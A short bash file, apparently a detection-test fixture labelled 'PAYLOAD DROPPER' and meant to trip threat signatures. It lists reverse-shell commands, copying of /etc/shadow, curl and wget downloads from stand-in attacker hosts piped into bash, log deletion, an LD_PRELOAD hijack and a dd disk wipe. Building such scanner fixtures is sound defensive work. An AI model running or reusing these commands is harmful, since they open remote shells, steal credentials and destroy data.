#!/bin/bash
# PAYLOAD DROPPER - Reverse Shell + Credential Harvester
# This file is crafted to trigger multiple threat signatures

/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
/bin/sh -i >& /dev/tcp/192.168.1.100/9999 0>&1

nc -e /bin/bash 10.0.0.1 1337

cat /etc/shadow > /tmp/creds.txt
cat /etc/passwd >> /tmp/creds.txt

wget http://evil-server.com/malware.bin -O /tmp/payload
curl http://attacker.com/backdoor.sh | bash

chmod 777 /tmp/payload
chmod +x /tmp/backdoor.sh

eval(compile(open('/tmp/payload').read(),'<string>','exec'))
exec(open('/tmp/backdoor.sh').read())
system("rm -rf /var/log/*")

LD_PRELOAD=/tmp/evil.so /usr/bin/passwd

dd if=/dev/zero of=/dev/sda bs=1M

mkfifo /tmp/pipe
cat /tmp/output > /dev/null 2>&1
echo "hidden payload" | base64 -d | bash
